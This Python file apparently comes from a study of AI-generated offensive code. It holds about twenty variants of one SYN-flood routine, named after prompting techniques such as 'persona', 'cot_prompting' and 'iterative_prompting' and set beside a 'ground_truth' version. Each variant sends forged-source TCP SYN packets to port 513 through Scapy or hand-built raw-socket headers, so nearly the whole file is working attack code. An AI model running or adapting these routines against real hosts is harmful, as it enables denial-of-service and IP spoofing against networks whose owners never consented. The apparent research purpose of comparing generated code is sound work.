from scapy.all import *
import socket
from struct import pack
import random
import struct
import sys    
import logging
import ipaddress

#Modifico il range  da (1024,1050) a (1024,1050) per scopi di testing
def ground_truth_code_synFlood(src, tgt):
    for sport in range(1024, 1050):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

def persona_synFlood(src, tgt):
    for src_port in range(1024, 1050):
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=src_port, dport=513, flags='S')
        packet = ip_layer/tcp_layer
        send(packet, verbose=False)

def template_synFlood(src, tgt):
    try:
        ip = IP(src=src, dst=tgt)
        for port in range(1024, 1050):
            tcp = TCP(sport=port, dport=513, flags='S')
            pkt = ip/tcp
            send(pkt, verbose=0)
    except ImportError as ie:
        print(f'Module import error: {str(ie)}')
    except Exception as e:
        print(f'An error occurred: {str(e)}')


def question_refinement_synFlood(src, tgt):
    for sport in range(1024, 1050):
        ip_packet = IP(src=src, dst=tgt)
        tcp_packet = TCP(sport=sport, dport=513, flags='S')
        packet = ip_packet / tcp_packet
        send(packet, verbose=0)

def alternative_approaches_synFlood(src, tgt):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error as err:
        raise RuntimeError(f'Socket creation failed: {err}')
    def checksum(msg):
        s = 0
        for i in range(0, len(msg) - 1, 2):
            w = (msg[i] << 8) + (msg[i + 1])
            s += w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    for src_port in range(1024, 1050):
        try:
            ip_hdr = pack('!BBHHHBBH4s4s',
                          69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0,
                          socket.inet_aton(src), socket.inet_aton(tgt))
            tcp_hdr = pack('!HHLLBBHHH',
                           src_port, 513, 0, 0, 5 << 4, 2, 1024, 0, 0)
            psh = pack('!4s4sBBH',
                       socket.inet_aton(src), socket.inet_aton(tgt), 0, socket.IPPROTO_TCP, len(tcp_hdr))
            psh = psh + tcp_hdr
            tcp_checksum = checksum(psh)
            tcp_hdr = pack('!HHLLBBH',
                           src_port, 513, 0, 0, 5 << 4, 2, 1024) + pack('H', tcp_checksum) + pack('!H', 0)
            packet = ip_hdr + tcp_hdr
            sock.sendto(packet, (tgt, 0))
        except Exception as err:
            raise RuntimeError(f'Error sending packet on port {src_port}: {err}')
    sock.close()

def context_manager_synFlood(src, tgt):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except OSError as e:
        print(f'Socket creation failed: {str(e)}')
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        0x45, 0, 40, 0, 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(src), socket.inet_aton(tgt)
    )
    for src_port in range(1024, 1050):
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            src_port,
            513,
            0,
            0,
            5 << 4,
            2,
            socket.htons(5840),
            0,
            0
        )
        packet = ip_header + tcp_header
        try:
            sock.sendto(packet, (tgt, 513))
        except OSError as e:
            print(f'Packet sending failed: {str(e)}')
            

def flipped_interaction_3_synFlood(src, tgt):
    try:
        for dport in range(1024, 1050):
            ip_layer = IP(src=src, dst=tgt)
            tcp_layer = TCP(sport=dport, dport=513, flags='S')
            packet = ip_layer/tcp_layer
            send(packet, verbose=False)
    except Exception as e:
        print(f"An error occurred: {e}")


def flipped_interaction_4_synFlood(src, tgt):
    for sport in range(1024, 1050):
        packet = IP(src=src, dst=tgt)/TCP(sport=sport, dport=513, flags='S')
        send(packet, verbose=0)


def flipped_interaction_5_synFlood(src, tgt):
    for src_port in range(1024, 1050):
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=src_port, dport=513, flags='S')
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

def iterative_prompting_3_syn_flood(src, tgt):
    conf.verb = 0
    def is_valid_ip(ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    if not is_valid_ip(src):
        raise ValueError(f"Invalid source IP address: {src}")
    if not is_valid_ip(tgt):
        raise ValueError(f"Invalid target IP address: {tgt}")
    src_port_range = range(1024, 1050)
    try:
        for src_port in src_port_range:
            ip_packet = IP(src=src, dst=tgt)
            tcp_packet = TCP(sport=src_port, dport=513, flags='S')
            packet = ip_packet / tcp_packet
            send(packet, verbose=False)
    except Exception as e:
        print(f"An error occurred during packet sending: {e}")

def iterative_prompting_4_syn_flood(src, tgt):
    try:
        ipaddress.ip_address(src)
        ipaddress.ip_address(tgt)
    except ValueError as ve:
        raise ValueError('Invalid IP address format.') from ve
    try:
        for sport in range(1024, 1050):
            ip = IP(src=src, dst=tgt)
            tcp = TCP(sport=sport, dport=513, flags='S')
            pkt = ip / tcp
            send(pkt, verbose=0)
    except (KeyboardInterrupt, SystemExit):
        print('Packet sending halted by user.')
        raise
    except Exception as e:
        raise RuntimeError('An error occurred while sending packets.') from e

def iterative_prompting_5_syn_flood(src, tgt):
    try:
        socket.inet_aton(src)
        socket.inet_aton(tgt)
    except socket.error as e:
        print(f'Invalid IP address format for src or tgtfrom {e}') 
    private_ip_ranges = (
        '192.168.',
        '10.',
        '172.16.',
    )
    if any(src.startswith(ip_range) for ip_range in private_ip_ranges):
        print('Private IP addresses are not allowed for the source IP')
    if any(tgt.startswith(ip_range) for ip_range in private_ip_ranges):
        print('The target IP should not be a private IP address')
    for src_port in range(1024, 1050):
        try:
            ip_packet = IP(src=src, dst=tgt)
            tcp_packet = TCP(sport=src_port, dport=513, flags='S')
            send(ip_packet / tcp_packet, verbose=0)
        except Exception as e:
            print(f'Error sending packet from source port {src_port}: {e}')

def few_shots_prompting_synFlood(src, tgt):
    for sport in range(1024, 1050):
        pkt = IP(src=src, dst=tgt) / TCP(sport=sport, dport=513, flags='S')
        send(pkt)

def cot_prompting_synFlood(src, tgt):
    for sport in range(1024, 1050):
        pkt = IP(src=src, dst=tgt) / TCP(sport=sport, dport=513, flags='S')
        send(pkt)

def fact_check_list_synFlood(src, tgt):
    for sport in range(1024, 1050):
        ip = IP(src=src, dst=tgt)
        tcp = TCP(sport=sport, dport=80, flags='S', seq=1000)
        packet = ip / tcp
        send(packet, verbose=False)


def not_interactive_mix_synFlood(src, tgt):
    logging.basicConfig(level=logging.INFO)
    ip_regex = re.compile(r'^\d{1,3}\.(?:\d{1,3}\.){2}\d{1,3}$')
    if not (ip_regex.match(src) and ip_regex.match(tgt)):
        raise ValueError("Invalid IP address format")
    for sport in range(1024, 1050):
        try:
            pkt = IP(src=src, dst=tgt) / TCP(sport=sport, dport=513, flags='S')
            send(pkt, verbose=False)
            logging.info(f'Sent SYN packet from {src}:{sport} to {tgt}:513')
        except Exception as e:
            logging.error(f'Failed to send packet from {src}:{sport} to {tgt}:513 - {e}')
            continue

def interactive_mix_syn_flood(src, tgt):
    from scapy.all import IP, TCP, send
    import logging
    logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
    for src_port in range(1024, 1050):
        try:
            pkt = IP(src=src, dst=tgt) / TCP(sport=src_port, dport=513, flags='S')
            send(pkt, verbose=False)
        except KeyboardInterrupt:
            print("Process interrupted by user.")
            break
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            continue

def baseline_synFlood(src, tgt):
    for sport in range(1024, 1050):
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=513, flags='S')
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)

